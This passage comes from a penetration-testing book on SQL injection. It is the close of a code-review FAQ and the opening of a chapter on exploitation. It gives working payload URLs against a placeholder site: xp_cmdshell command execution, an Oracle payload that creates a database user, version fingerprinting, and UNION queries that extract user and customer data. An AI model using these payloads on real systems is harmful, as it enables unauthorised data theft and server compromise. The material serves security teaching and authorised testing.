findstr utility natively av ailable on Win32 systems. You probably could also use \nyour IDE to search source files for string patterns. It may even be possible to extend its functionality through the use of a plug -in. Google is your friend.  \nQ: I think I have identified a vulnerability  in the source code for application X. A sink uses \ntainted data from a sink source; I have traced the data flow and execution path and I am confident that there is a real SQL injection vulnerability. How can I be absolutely certain, and what should I do ne xt? \nA: You have a path to choose that only you can follow. You can choose the dark side and \nexploit the vulnerability for profit. Or you can chase fame and fortune by reporting the \nvulnerability to the vendor and working with them to fix the vulnerability, resulting in a \nresponsible disclosure crediting your skills! Or, if you are a software developer or auditor working for the vendor, you can try to exploit the vulnerability using the techniques and tools presented in this book (within a test environment a nd with explicit permission from system and \napplication owners!) and show management your talents in the hope of finally receiving that promotion. \nQ: I don’t have the money to invest in a commercial source code analyzer; can any of the free \ntools really be  that useful as an alternative?  \nA: Try them and see. They aren’t perfect, they haven’t had many resources available to them \nas the commercial alternatives, and they definitely do not have as many bells and whistles, but \nthey are certainly worth trying. Whi le you are at it, why not help the developers improve their \nproducts by providing constructive feedback and working with them to enhance their capabilities? Learn how to extend the tools to fit your circumstances and environment. If you can, consider donat ing financial aid or resources to the projects for mutual benefit.  \n \n \n \n \n \n \n \n \n \nChapter 4  \nExploiting SQL injection  \nAlberto Revelli  \nSolutions in this chapter:  \n• Understanding Common Exploit Techniques  \n• Identifying the Database \n• Extracting Data Through UNION Statements  \n• Using Conditional Statements  \n• Enumerating the Database Schema  \n• Injecting into “INSERT” Queries  \n• Escalating Privileges  \n• Stealing the Password Hashes  \n• Out -of-Band Communication \n• SQL Injection on Mobile Devices  \n• Automating SQL Injection Exploitation  \nIntroduction  \nOnce you have found and confirmed that you have an SQL injection point, what do you do \nwith it? You may know you can interact with the database, but you don’t know what the back-end database is, or anything about the query you are injecting i nto, or the table(s) it is \naccessing. Again, using inference techniques and the useful error the application gives you, you can determine all of this, and more. \nIn this chapter, we will discuss how deep the rabbit hole goes (you did take the red pill, \ndidn’t you?). We’ll explore a number of the building blocks you’ll need for later chapters, as \nwell as exploit techniques for reading or returning data to the browser, for enumerating the \ndatabase schema from the database, and for returning information out of band (i.e. not through the browser). Some of the attacks will be targeted to extract the data that the remote database stores and others will be focused on the database management system (DBMS) itself, such as trying to steal the database users’ password h ashes. Because some of these attacks need \nadministrative privileges to be carried out successfully, and because the queries that many Web applications run are performed with the privileges of a normal user, we will also illustrate some strategies for obtai ning administrative privileges. And finally, so that you don’t have to \ndo it all manually, we’ll also look at techniques and tools (many written by the authors of this book) for automating a lot of these steps for efficiency . \nTools & Traps…  \nThe Big Danger:  Modifying Live Data \nAlthough the examples in the following sections will deal primarily with injections into SELECT  statements, \nnever forget that your vulnerable parameter could be used in far more dangerous queries that use commands such \nas INSERT, UPDATE , or DELETE  instead. Although a SELECT  command only retrieves data from the database \nand strictly follows a “look but don’t touch” approach, other commands can (and will) change the actual data in \nthe database that you are testing, which migh t cause major problems in the case of a live application. As a general \napproach, when performing an SQL injection attack on an application where more than one parameter is \nvulnerable, always try to give priority to parameters that are used in queries that do not modify any data. This will \nallow you to operate far more effectively, freely using your favorite techniques without the risk of tainting the \ndata or even disrupting application functionality.  \nOn the other hand, if the only vulnerable parameters at your disposal are used to modify some data, most of the \ntechniques outlined in this chapter will be useful for exploiting the vulnerability. However, be extra careful in \nwhat you inject and how this might affect the database. If the application you are test ing is in production, before \nperforming the actual attack make sure all the data is backed up and that it is possible to perform a full rollback \nafter the security testing of the application has been completed.  \nThis is especially true when using an automated tool such as the ones I will introduce at the end of the chapter. \nSuch tools can easily execute hundreds or thousands of queries in a very short time to do their job, all with \nminimal user interaction. Using such a tool to inject on an UPDATE  or a DELET E statement can wreak havoc on \na database server, so be careful! Later in this chapter, we will include some hints about how to deal with these \nkinds of queries.  \nUnderstanding common exploit techniques  \nArriving at this point, you have probably found one or  more vulnerable parameters on the Web \napplication you are testing, by either using the techniques for testing the application outlined in \nChapter 2 , or reviewing the code outlined in Chapter 3 . Perhaps a single quote inserted in the \nfirst GET  parameter that you tried was sufficient to make the application return a database \nerror, or maybe you literally spent days stubbornly going through each parameter trying entire arrays of different and exotic attack vectors. Whatever the case, now is the ti me to have some \nreal fun with the actual exploitation.  \nIt is very useful at this stage to have a local installation of the same database system that sits \nbehind the application you are attacking. Unless you have the Web application source code, SQL injection requires a black- box attack approach, and you will have to craft the queries to \ninject by observing how your target responds to your requests. Being able to locally test the queries you are going to inject in order to see how the database responds to such queries (both in terms of returned data and error messages) makes this phase a lot easier.  \nExploiting a SQL injection vulnerability can mean different things in different situations \ndepending on the conditions in place, such as the privileges of the use r performing the queries, \nthe exact database server that sits at the back -end, and whether you are more interested in \nextracting data, modifying data, or running commands on the remote host. However, at this stage what really makes a difference is whether the application presents in the HTML code the \noutput of your SQL queries (even if the database server returns only the error message). If you don’t have any kind of SQL output displayed within the application, you will need to perform a blind SQL injection  attack, which is more intricate (but a lot more fun). We’ll extensively \ncover blind SQL injection in Chapter 5 . For now, and unless specified otherwise, we will \nassume that the remote database returns SQL output to some extent, and we will go through a plethora of attack techniques that leverage this fact.  \nFor most of our examples, we’ll introduce the companion that will be with us throughout \nmost of the examples in this chapter: a vulnerable e -commerce application bel onging to our \nusual victim.com friends. This application has a page that allows a user to browse the different \nproducts. The URL is as follows:  \n• http://www.victim.com/products.asp?id=12  \nWhen this URL is requested, the application returns a page with the details of the product \nwith an id  value of 12 (say, a nice Syngress book on SQL injection), as shown in Figure 4.1.  \n \nFigure 4.1  The Product Description Page of a Sample E -Commerce Site  \nLet’s say the id  parameter is vulnerable to S QL injection. It’s a numeric parameter, and \ntherefore in our examples we will not need to use single quotes to terminate  any strings. But \nthe same concepts that we will explore along the way are obviously valid for other types of \ndata. We will also assume that victim.com uses Microsoft SQL Server as its back -end database \n(even though the chapter will also contain several examples for other database servers). To improve clarity, all our examples will be based on GET  requests, which will allow us to put all \nthe injected payloads in the URL. However, you can apply the same techniques for POST  \nrequests by including the injected code into the request body instead of the URL.  \nTip \nRemember that when using all of the following e xploitation techniques, you might need to comment out the rest \nof the original query to obtain syntactically correct SQL code (e.g. by adding two hyphens, or a # character in the \ncase of MySQL). See Chapter 2  for more information on how to terminate SQL queries using comments.  \nUsing Stacked Queries  \nOne of the elements that have a considerable impact on the ability to exploit a SQL injection vulnerability is whether stacked queries (a sequence of multiple querie s executed in a single \n\nconnection to the database) are allowed. Here is an example of an injected stacked query, in \nwhich we call the xp_cmdshell  extended procedure to execute a command:  \nhttp://www.victim.com/products.asp=id=1;exec+master..xp_cmdshell+‘dir’  \nBeing able to close the original query and append a completely new one, and leveraging the \nfact that the remote database server will execute both of them in sequence, provides far more freedom and possibilities to the attacker compared to a situation where  you can only inject \ncodes in the original query.  \nUnfortunately, stacked queries are not available on all database server platforms. Whether \nthis is the case depends on the remote database server as well as on the technology framework \nin use. For instance, Microsoft SQL Server allows stacked queries when it is accessed by ASP, \n.NET, and PHP, but not when it is accessed by Java. PHP also allows stacked queries when \nused to access PostgreSQL, but not when used to access MySQL.  \nFerruh Mavituna, a security rese archer and tool author, published a table that collects this \ninformation on his SQL Injection Cheat Sheet; see http://ferruh.mavituna.com/sql -injection -\ncheatsheet -oku/. \nExploiting Ora cle from Web Applications  \nOracle poses a challenge when exploiting SQL injection over the Web. One of the biggest handicaps is the limitation of the Oracle SQL syntax, which does not allow execution of stacked queries.  \nIn order to execute multiple statemen ts in Oracle’s SQL language we need to find a way to \nexecute a PL/SQL block. PL/SQL is a programming language built directly  into Oracle that \nextends SQL and does allow stacked commands. One option is to use an anonymous PL/SQL block, which is a free -floating chunk of PL/SQL code wrapped between a BEGIN and an END \nstatement. The following demonstrates an anonymous “Hello World” PL/SQL code block:  \nSQL> DECLARE  \nMESG VARCHAR2(200);  \nBEGIN  \nMESG:=‘HELLO WORLD’;  \nDBMS_OUTPUT.PUT_LINE(MESG);  \nEND; \n/ \nBy default Oracle comes with a number of default packages, two of which have been \nshipped with Oracle Versions 8i to 11g R2 that allow execution of anonymous PL/SQL blocks. \nThese functions are:  \n• dbms_xmlquery.newcontext()  \n• dbms_xmlquery.getxml()  \nFurther, these functions are accessible to PUBLIC by default. Thus any database user, \nirrespective of access privileges has permission to execute these functions. These functions can be used to issue DML/DDL statements when exploiting SQL injection as demonstrated below (creating a new database user, assuming the database user has CREATE USER privileges):  \nhttp://www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.newcontext(‘declare PRAGMA \nAUTONOMOUS_TRANSACTION; begin execute immediate ‘‘ create user pwned identified by pwn3d \n’’; commit; end;’) from dual) is not null -- \nThe ability to execute PL/SQL in this way gives us the same level of control as an attacker \nwould have during interactive access (e.g. via a sqlplus prompt), therefore allowing us to call \nfunctionality not norma lly accessible via Oracle SQL.  \nIdentifying the database  \nTo successfully launch any SQL injection attack, it is of paramount importance to know the exact database server that the application is using. Without that piece of information, it is impossible to f ine-tune the queries to inject and extract the data you are interested in.  \nThe Web application technology will give you your first hint. For instance, ASP and .NET \noften use Microsoft SQL Server as the back -end database. On the other hand, a PHP \napplicatio n is likely to be using MySQL or PostgreSQL. If the application is written in Java, it \nprobably talks with an Oracle or a MySQL database. Also, the underlying operating system might give you some hints: a server farm of Internet  Information Server (IIS) in stallations is a \nsign of a Microsoft -based infrastructure, so SQL Server is probably behind it. Meanwhile, a \nLinux server running Apache and PHP is more likely to be using an open source database such \nas MySQL or PostgreSQL. Obviously, you should not rely only on these considerations for your fingerprinting effort, because it is not unusual for administrators to combine different technologies in ways that are less common. However, the infrastructure that is in front of the database server, if correctly iden tified and fingerprinted, can provide several hints that will \nspeed up the actual fingerprinting process.  \nThe best way to uniquely identify the database depends heavily on whether you are in a \nblind or non- blind situation. If the application returns, at le ast to a certain level, the results of \nyour queries and/or the error messages of the database server (i.e. a non -blind situation), the \nfingerprint is fairly straightforward, because it is very easy to generate output that provides information about the underlying technology. On the other hand, if you are in a blind situation and you can’t get the application to return database server messages, you need to change your approach and try to inject queries that are known to work on only a specific technology. Depending on which of those queries are successfully executed, you will be able to obtain an \naccurate picture of the database server you are dealing with.  \nNon-Blind Fingerprint  \nVery often, all it takes to get an idea of the back -end database server is to see one error \nmessage that is verbose enough. The message generated by the same kind of SQL error will be different depending on the database server technology that was used to e xecute the query. For \ninstance, adding a single quote will force the database server to consider the characters that follow it as a string instead of as SQL code, and this will generate a syntax error. On Microsoft SQL Server, the resultant error message w ill probably look similar to the screenshot shown in \nFigure 4.2.  \n \nFigure 4.2  SQL Error Me ssage Resulting from an Unclosed Quotation Mark  \nIt’s hard to imagine anything easier: the error message clearly mentions “SQL Server,” plus \nsome helpful details regarding what went wrong, which will be useful later when you’re \ncrafting a correct query. A s yntax error generated by MySQL 5.0, on the other hand, will more \nlikely be the following:  \nERROR 1064 (42000): You have an error in your SQL syntax; check the manual  \nthat corresponds to your MySQL server version for the right syntax to use  \nnear ’’ at line 1  \nAlso in this case, the error message contains a clear hint of the database server technology. \nOther errors might not be as useful, but this is not usually a problem. Note the two error codes at the beginning of the last error message. Those by themselves form a signature for MySQL. For instance, if you try to extract data from a non- existent table on the same MySQL \ninstallation, you will receive the following error: \nERROR 1146(42S02): Table ‘foo.bar’ doesn’t exist  \n\nAs you can see, databases generally prepen d an error message with some kind of code that \nuniquely identifies the error type. As a further example, you might guess the database server \nthat generated the following error:  \nORA-01773:may not specify column datatypes in this CREATE TABLE  \nThe “ORA” strin g at the beginning is the giveaway: It is an Oracle installation! A complete \nrepository of all Oracle error messages is available at www.ora -code.com . \nSometimes, the revealing bit does not come from the database serv er itself, but from the \ntechnology used to talk to it. For instance, look at the following error:  \npg_query(): Query failed: ERROR: unterminated quoted string at or near “‘’’ at character 69 \nin /var/www/php/somepge.php on line 20  \nThe database server technol ogy is not mentioned, and there is not an error code that is \npeculiar to a specific product. However, the function pg_query (and the deprecated version pg_exec) is used by PHP to run queries on PostgreSQL databases, and therefore immediately reveals this d atabase server being used in the back -end. \nRemember: Google is your friend, and any error code, function name, or apparently obscure \nstring can help you fingerprinting the back- end in a matter of seconds.  \nBanner Grabbing  \nError messages can allow you to obt ain a fairly precise idea of the technology the Web \napplication uses to store its data. However, this is not enough, and you can go beyond that. In the first example, for instance, we discovered that the remote database is SQL Server, but there are various  versions of this product; at the time of this writing, the most widespread versions \nare SQL Server 2005 and 2008, but there are still SQL Server 2000 installations in use. Being able to discover a few more details, such as the exact version and patch level, would allow you \nto quickly understand whether the remote database has some well -known flaw that you can \nexploit.  \nLuckily, if the Web application returns the results of the injected queries, figuring out the \nexact technology is usually straightforward. A ll major database technologies allow at least one \nspecific query that returns the software version, and all you need is to make the Web application return the result of that query. Table 4.1 provides some examples of queries that \nwill return, for a given technology, a string containing the exact database server version.  \nTable 4.1  Returning the Database Server Version  \nDatabase Server  Query \nMicrosoft SQL Server  SELECT @@version  \nMySQL  SELECT version()  \n SELECT @@version  \nOracle  SELECT banner FROM v$version \n SELECT banner FROM v$version WHERE rownum=1  \nPostgreSQL  SELECT version()  \nFor instance, running the query on SQL Server 2008 RTM, by issuing the query SELECT \n@@version you will obtain the following:  \nMicrosoft SQL Server 2008 (RTM) -  10.0.1600.22 (Intel X86)  \nJul 9 2008 14:43:34  \nCopyright (c) 1988 –2008 Microsoft Corporation  \nStandard Edition on Windows NT 5.2 <X86> (Build 3790: Service Pack 2)  \nThat is quite a lot of informa tion, because it includes not only the exact version and patch \nlevel of SQL Server, but also information about the operating system on which it is installed, \nsince “NT 5.2” refers to Windows Server 2003, to which Service Pack 2 has been applied.  \nBecause Mi crosoft SQL Server produces very verbose messages, it is not too hard to \ngenerate one that contains the value @@version . For instance, in the case of a numeric \ninjectable parameter, you can trigger a type conversion error by simply injecting the name of \nthe variable where the application expects a numeric value. As an example, consider the \nfollowing URL:  \nhttp://www.victim.com/products.asp?id=@@version  \nThe application is expecting a number for the id  field, but we pass it the value of \n@@version, which is a s tring. SQL Server, when executing the query, will dutifully take the \nvalue of @@version  and will try to convert it to an integer, generating an error similar to the \none in Figure 4.3, which tells us that we are dealin g with SQL Server 2005 and includes the \nexact build level and information regarding the underlying operating system.  \nTip \nVersion Information on PostgreSQL  \nMicrosoft SQL Server is not the only database to return information about the underlying operating sy stem and \narchitecture: PostgreSQL also returns a wealth of information, as you can see in the following example, which is a \nresult of running the query SELECT version():  \nPostgreSQL 9.1.1 on i686- pc-linux-gnu, compiled by i686 -pc-linux-gnu-gcc (Gentoo Harde ned 4.4.5 p1.2, pie -\n0.4.5, 32 -bit) \nIn this case, not only we know the version of the database server but also the underlying Linux flavor \n(Hardened Gentoo), the architecture (32  bits), and even the version of the compiler used to compile the database \nserve r itself (gcc 4.4.5): all this information might become extremely useful in case, after our SQL Injection, we \nfind some memory corruption bug that we need to exploit to expand our influence at the operating system level.  \n \nFigure 4.3  Extracting the Server Version Using an Error Message  \nOf course, if the only injectable parameter is not a number you can still retrieve the \ninformation you need. For instance, if the injectable parameter is echoed back in a response, \nyou can easily inject @@version  as part of that string. More specifically, let’s assume that we \nhave a search page that returns all the entries that contain the specified string:  \nhttp://www.victim.com/searchpeople.asp?name=smith  \nSuch a URL will probably be used in a query that will look something like the following:  \nSELECT name,phone,email FROM people WHERE name LIKE ‘%smith%’  \nThe resultant page will contain a message similar to this:  \n100 results founds for smith  \nTo retrieve the database version, you can inject on the name  parameter as follows: \nhttp://www.victim.com/searchpeople.asp?name=‘%2B@@version%2B’  \nThe resultant query will therefore become:  \nSELECT name,phone,email FROM people WHERE name LIKE ‘%’+@@version+‘%’  \n\nThis query will look for names that contain the string stored in @@version, which will \nprobably be zero; however, the  resultant page will have all the information you are looking for \n(in this case we assume that the target database server is Microsoft SQL Server 2000):  \n0 results found for Microsoft SQL Server 2000 –  8.00.194 (Intel X86) Aug 6  \n2000 00:57:48 Copyright (c) 1988–2000 Microsoft Corporation Standard Edition  \non Windows NT 5.0 (Build 2195: Service Pack 4)  \nYou can repeat these techniques for other pieces of information that can be useful for \nobtaining a more accurate fingerprint. Here are some of the most useful M icrosoft SQL Server \nbuilt-in variables:  \n• @@version : Database server version.  \n• @@servername:  Name of the server where SQL Server is installed.  \n• @@language : Name of the language that is currently used.  \n• @@spid:  Process ID of the current user.  \n• Detailed version information can also be found using the following queries:  \n• SELECT SERVERPROPERTY(‘productversion’) : For example, 100.1600.22 \n• SELECT SERVERPROPERTY(‘productlevel’) : For example, RTM  \n• SELECT SERVERPROPERTY(‘edition’) : For example, Enterprise  \n• EXEC master..msver : For even more verbose information, including number of processors, \nprocessor type, physical memory and more  \nBlind Fingerprint  \nIf the application does not return the desired information directly in the response, you need an \nindirect appro ach in order to understand the technology that is used in the back- end. Such an \nindirect approach is based on the subtle differences in the SQL dialects the different database servers use. The most common technique leverages the differences in how the vari ous products \nconcatenate strings. Let’s take the following simple query as an example:  \nSELECT ‘somestring’  \nThis query is valid for all major database servers, but if you want to split the string into two \nsubstrings, the differences start to appear. More specifically, you can use the differences noted \nin Table 4.2. \nTable 4.2  Inferring the Database Server Version from Strings  \nDatabase Server  Query \nMicrosoft SQL Server  SELECT ‘some’ + ‘string’  \nMySQL  SELECT ‘some’ ‘string’  \n SELECT CONCAT(‘some’,‘string’)  \nOracle  SELECT ‘some’ || ‘string’ \n SELECT CONCAT(‘some’,‘string’)  \nPostgreSQL  SELECT ‘some’ || ‘string’ \n SELECT CONCAT(‘some’,‘string’)  \nTherefore, if you have an injectable string parameter, you can try the different concatenation \nsyntaxes. Depending on which one of them returns the  same result as the original request, you \ncan infer the remote database technology.  \nIn case you don’t have a vulnerable string parameter available, you can perform a similar \ntechnique for numeric parameters. More specifically, you need an SQL statement tha t, on a \nspecific technology, evaluates to a number. All of the expressions in Table 4.3 will evaluate to \nan integer number on the correct database and will generate an error on all others. \nTable 4.3  Inferring the Data base Server Version from Numeric Functions  \nDatabase Server  Query \nMicrosoft SQL Server  @@pack_received  \n @@rowcount  \nMySQL  connection_id()  \n last_insert_id()  \n row_count()  \nOracle  BITAND(1,1)  \nPostgreSQL  SELECT EXTRACT(DOW FROM NOW())  \nFinally, simply using some specific SQL construct that is peculiar to a particular dialect is \nanother effective technique that works very well in most situations. For instance, successfully \ninjecting a WAITFOR DELAY  is a clear sign that Microsoft SQL Server is used on the other \nside, whereas successfully injecting a SELECT pg_sleep(10) will be a sure sign that we are dealing with PostgreSQL (and also that its version is at least 8.2).  \nIf you are dealing with MySQL, there is a very interesting trick that allows you to determine \nits exact version. We know that comments on MySQL can be included in three different ways:  \n1. A # character at the end of the line.  \n2. A “ --” sequence at the end of the line (don’t forget the space after the second hyphen).  \n3. A “/∗” sequence followed by a “∗/” sequence, with the characters in between being the \ncomment.  \nThe third syntax allows further tweaking: If you add an exclamation mark followed by a \nversion number at the beginning of the comment, the  comment will be parsed as code and will \nbe executed only if the version installed is greater than or equal to the version indicated in the \ncomment. Sounds complicated? Take a look at the following MySQL query:  \nSELECT 1 / ∗!40119 + 1∗ / \nThis query will retur n the following results:  \n• 2 if the version of MySQL is 4.01.19 or later.  \n• 1 otherwise.  \nDon’t forget that some SQL injection tools provide some level of help in terms of \nidentifying the remote database server. One of them is sqlmap ( http://sqlmap.sourceforge.net ), \nwhich has an extensive database of signatures to help you in the fingerprinting task. We will cover sqlmap in more detail at the end of this chapter. If you know that you are dealing with Microsoft SQ L Server, sqlninja (also covered at the end of this chapter) allows you to \nfingerprint the database server version, the database user and its privileges, what kind of authentication is used (mixed or Windows -only) and whether SQLSERVR.EXE is running as \nSYSTEM.  \nExtracting data through UNION statements  \nBy this point, you should have a clear idea of the database server technology you are dealing with. We will continue our journey across all possible SQL injection techniques with the UNION  operator which is one  of the most useful tools that a database  administrator (DBA) has \nat his disposal: You use it to combine the results of two or more SELECT  statements. Its basic \nsyntax is as follows: \nSELECT column- 1,column- 2,…,column- N FROM table- 1 \nUNION  \nSELECT column- 1,column- 2,…,column- N FROM table- 2 \nThis query, once executed, will do exactly what you think: It will return a table that includes \nthe results returned by both SELECT  statements. By default, this will include only distinct \nvalues. If you want  to include duplicate values in the resultant table, you need to slightly \nmodify the syntax:  \nSELECT column- 1,column- 2,…,column- N FROM table- 1 \nUNION ALL  \nSELECT column- 1,column- 2,…,column- N FROM table- 2 \nThe potential of this operator in an SQL injection atta ck is evident: If the application returns \nall the data returned by the first (original) query, by injecting a UNION  followed by another \narbitrary query you can read any table to which the database user has access. Sounds easy, \ndoesn’t it? Well, it is, but there are a few rules to follow, which will be explained in the \nfollowing subsections. \nMatching Columns  \nTo work properly, the UNION  operator needs the following requirements to be satisfied:  \n• The two queries must return exactly the same number of columns.  \n• The data in the corresponding columns of the two SELECT  statements must be of the same \n(or at least compatible) types.  \nIf these two constraints are not satisfied, the query will fail and an error will be returned. \nThe exact error message, of course, dep ends on which database server technology is used at \nthe back -end, which can be useful as a fingerprinting tool in case the Web application returns \nthe whole message to the user. Table 4.4 contains a list of the error messages that some of the \nmajor database servers return when a UNION  query has the wrong number of columns. \nTable 4.4  Inferring the Database Server Version from UNION -Based Errors  \nDatabase Server  Query \nMicrosoft SQL All queries combined using a UNION, INTERSECT or EXCEPT operator \nDatabase Server  Query \nServer  must have an equal number of expressions in their target lists  \nMySQL  The used SELECT statements have a different number of columns  \nOracle  ORA- 01789: query block has incorrect number of result columns  \nPostgreSQL  ERROR: Each UNION query must have the same number of columns  \nBecause the error messages do not provide any hints regarding the required number of \ncolumns, the only way to derive the correct number is by trial and error. There are two main \nmethods for finding the exact number of columns. The first consists of injecti ng the second \nquery multiple times, gradually increasing the number of columns until the query executes correctly. On most recent database servers (notably not on Oracle 8i or earlier), you can inject the NULL  value for each column, as the NULL  value can b e converted to any other data type, \ntherefore avoiding errors caused by different data types in the same column.  \nSo, for instance, if you need to find the correct number of columns of the query executed by \nthe products.asp page, you can request URLs such a s the following until no error is returned:  \nhttp://www.victim.com/products.asp?id=12+union+select+null -- \nhttp://www.victim.com/products.asp?id=12+union+select+null,null--  \nhttp://www.victim.com/products.asp?id=12+union+select+null,null,null--  \nNote that Oracle requires that every SELECT  query contains a FROM  attribute. Therefore, if \nyou are dealing with Oracle, you should modify the previous URL as follows:  \nhttp://www.victim.com/products.asp?id=12+union+select+null+from+dual--  \ndual is a table that is accessib le by all users, and allows you to use a SELECT  statement \neven when you are not interested in extracting data from a particular table, such as in this case.  \nAnother way to reconstruct the same information is to use the ORDER BY  clause instead of \ninjecting another query. ORDER BY  can accept a column name as a parameter, but also a \nsimple number to identify a specific column. You can therefore identify the number of \ncolumns in the query by incrementing the ORDER BY  column number as follows:  \nhttp://www.victim. com/products.asp?id=12+order+by+1  \nhttp://www.victim.com/products.asp?id=12+order+by+2  \nhttp://www.victim.com/products.asp?id=12+order+by+3 etc.  \nIf you receive the first error when using ORDER BY 6 , it means your query has exactly five \ncolumns. \nWhich method should you choose? The second method is usually better, and for two main \nreasons. To begin with, the ORDER BY  method is faster, especially if the table has a large \nnumber of columns. If the correct number of columns is n, the first method will need n  \nreque sts to find the exact number. This is because this method will  always generate an error \nunless you use the right value. On the other hand, the second method generates an error only when you use a number that is larger than the correct one. This means you c an use a binary \nsearch for the correct number. For instance, assuming that your table has 13 columns, you can go through the following steps:  \n1. Start trying with ORDER BY 8 , which does not return an error. This means the correct \nnumber of columns is 8 or greater.  \n2. Try again with ORDER BY 16 , which does return an error. You therefore know that the \ncorrect number of columns is between 8 and 15.  \n3. Try with ORDER BY 12 , which does not return an error. You now know that the correct \nnumber of columns is between 12 and 15.  \n4. Try with ORDER BY 14 , which does return an error. You now know that the correct number \nis either 12 or 13.  \n5. Try with ORDER BY 13 , which does not re turn an error. This is the correct number of \ncolumns. \nYou therefore have used five requests instead of 13. For readers who like mathematical \nexpressions, a binary search to retrieve a value n from the database needs O(log( n)) \nconnections. A second good rea son to use the ORDER BY  method is the fact that it has a far \nsmaller footprint, because it will usually leave far fewer errors on the database logs.  \nMatching Data Types  \nOnce you have identified the exact number of columns, it’s time to choose one or more of \nthem to visualize the data you are looking for. However, as was mentioned earlier, the data types of the corresponding columns must be of a compatible type. Therefore, assuming that you are interested in extracting a string value (e.g. the current database user), you need to find at least one column that has a string as the data type, to use that column to store the data you are looking for. This is simple to do with NULL s, as you only need to substitute, one column at \na time, one NULL  with a sample strin g. So, for instance, if you found that the original query \nhas four columns, you should try the following URLs:  \nhttp://www.victim.com/products.asp?id=12+union+select+‘test’,NULL,NULL,NULL  \nhttp://www.victim.com/products.asp?id=12+union+select+NULL,‘test’,NULL,NULL  \nhttp://www.victim.com/products.asp?id=12+union+select+NULL,NULL,‘test’,NULL  \nhttp://www.victim.com/products.asp?id=12+union+select+NULL,NULL,NULL,‘test’  \nFor databases where using NULL  is not possible (such as Oracle 8i), the only way to derive \nthis information is through brute -force guessing. This approach can be very time -consuming, \nas each combination of possible data types must be tried, and is  therefore practical with only \nsmall numbers of columns. One tool that can help automate this type of column guessing is Unibrute, which is available at https://github.com/GDSSecurity/Unibrute . \nAs soon as the application does not return an error, you will know that the column you just \nused to store the test  value can hold a string, and that it therefore can be used to display your \ndata. For instance, if the second column can contain a string field, and assuming that you want to obtain the name of the current user, you can simply request the following URL : \nhttp://www.victim.com/products.asp?id=12+union+select+NULL,system_user,NULL,NULL  \nSuch a query will result in a screenshot similar to the one in Figure 4.4.  \n \nFigure 4.4  Example of a Successful UNION -based SQL Injection  \nSuccess! As you can see, the table now contains a new row that contains the data you were \nlooking for! A lso, you can easily generalize this attack to extract entire databases one piece at \na time, as you will see shortly. However, before moving on, another couple of tricks are \nneeded to illustrate that it can be useful when using UNION  to extract data. In the preceding \ncase, we have four different columns that we can play with: Two of them contain a string and two of them contain an integer. In such a scenario, you could therefore use multiple columns to extract data. For instance, the following URL would retr ieve both the name of the current user \nand the name of the current database:  \nhttp://www.victim.com/products.asp?id=12+union+select+NULL,system_user,db_name(),NULL  \nHowever, you might not be so lucky, because you could have only one column that can \ncontains the data you are interested in, and several pieces of data to extract. Obviously, you \ncould simply perform one request for each piece of information, but luckily we have a better (and faster) alternative. Take a look at the following query, which uses the concatenation operator for SQL Server (refer to Table 4.2 earlier in the chapter for concatenation operators \nfor other database server platforms):  \nSELECT NULL, system_user + ‘ | ’ + db_name(), NULL, NULL  \n\nThis query concatenates the values of system_user  and db_name()  (with an extra “|” \ncharacter in between to improve readability) into one column, and translates into the following \nURL:  \nhttp://www.victim.com/products.asp?id=12+union+select+NULL,system_user%2B‘+|+’%2Bdb_name(),N\nULL,NULL  \nSubmitting this request results in the page shown in Figure 4.5.  \n \nFigure 4.5  Using the Same Column for Multiple D ata \nAs you can see, we have been able to link together multiple pieces of information and return \nthem in a single column. You can also use this technique to link different columns, such as in the following query:  \nSELECT column1 FROM table 1 UNION SELECT columnA + ‘ | ’ + columnB FROM tableA  \nNote that column1, columnA , and columnB  must be strings for this to work. If this is not the \ncase, you have another weapon in your arsenal, because you can try casting  to a string the \ncolumns whose data is of a different type. Table 4.5 lists the syntax for converting arbitrary \ndata to a string for the various databases.  \nTable 4.5  Cast Operators  \n\nDatabase Server  Query \nMicrosoft SQL S erver  SELECT CAST(‘123’ AS varchar)  \nMySQL  SELECT CAST(‘123’ AS char)  \nOracle  SELECT CAST(1 AS char) FROM dual  \nPostgreSQL  SELECT CAST(123 AS text)  \nRemember that depending on the constructs you use to extract data, you don’t always need \nto cast: for instance, PostgreSQL allows non- string variables to be used with the concatenation \noperator (||) as long as at least one input is a string.  \nSo far, we hav e shown examples in which a UNION SELECT  query was used to extract only \none piece of information (e.g. the database name). However, the real power of UNION -based \nSQL injection becomes evident when you use it to extract entire tables at once. If the Web \napplication is written so that it will correctly present the data returned by the UNION SELECT  \nin addition to the original query, why not leverage that to retrieve as much data as possible with each query? Let us say you know the current database has a table called customers  and \nthat the table contains the columns userid, first_name , and last_name  (you will see how to \nretrieve such information when enumeration of the database schema is illustrated later in this chapter). From what you have seen so far, you know you can use the following URL to retrieve the usernames:  \nhttp://www.victim.com/products.asp?id=12+UNION+SELECT+userid,first_name,second_name,NULL+FRO\nM+customers  \nWhen you submit this URL you will obtain the response shown in Figure 4.6. \n \nFigure 4.6  Using UNION SELECT  Queries to Extract Multip le Rows in a Single Request  \nOne URL and you have the full listing of users! Although this is great, very often you will \nhave to deal with applications that, although vulnerable to UNION -based SQL injection, will \nshow only the first row of results. In other  words, the UNION  query is successfully injected \nand successfully executed by the back -end database which dutifully sends back all the rows, \nbut then the Web application (the products.asp file, in this case) will parse and visualize only \nthe first row. How  can you exploit the vulnerability in such a case? If you are trying to extract \nonly one row of information, such as for the current user’s name, you need to get rid of the original row of results. As an example, here’s the URL we used a few pages back to retrieve the name of the database user running the queries:  \nhttp://www.victim.com/products.asp?id=12+union+select+NULL,system_user,NULL,NULL  \nThis URL will probably make the remote database server execute a query such as the \nfollowing:  \nSELECT id,type,description,price FROM products WHERE id = 12 UNION SELECT \nNULL,system_user,NULL,NULL  \n\nTo prevent the query from returning the first row of the result (the one containing the item \ndetails) you need to add a condition that always makes the WHERE  clause false, befo re \ninjecting the UNION  query. For instance, you can inject the following:  \nhttp://www.victim.com/products.asp?id=12+and+1=0+union+select+NULL,system_user, NULL, NULL  \nThe resultant query that is passed at the database now becomes the following:  \nSELECT id,type,name,price FROM e- shops..products WHERE id = 12 AND 1=0 UNION SELECT \nNULL,system_user,NULL,NULL  \nBecause the value 1  is never equal to the value 0, the first WHERE  will always be false, the \ndata of the product with ID 12 will not be returned, and the only row the application will return \nwill contain the value system_user . \nWith an additional trick, you can use the same technique to extract the values of entire \ntables, such as the customers  table, one row at a time. The first row is retrieved  with the \nfollowing URL, which will remove the original row using the “1=0” inequality:  \nhttp://www.victim.com/products.asp?id=12+and+1=0+union+select+userid,first_name,second_name,\nNULL+from+customers  \nThis URL will return one line of data that will contain the first and last names of the first \ncustomer —Charles Smith, whose user ID equals 1. 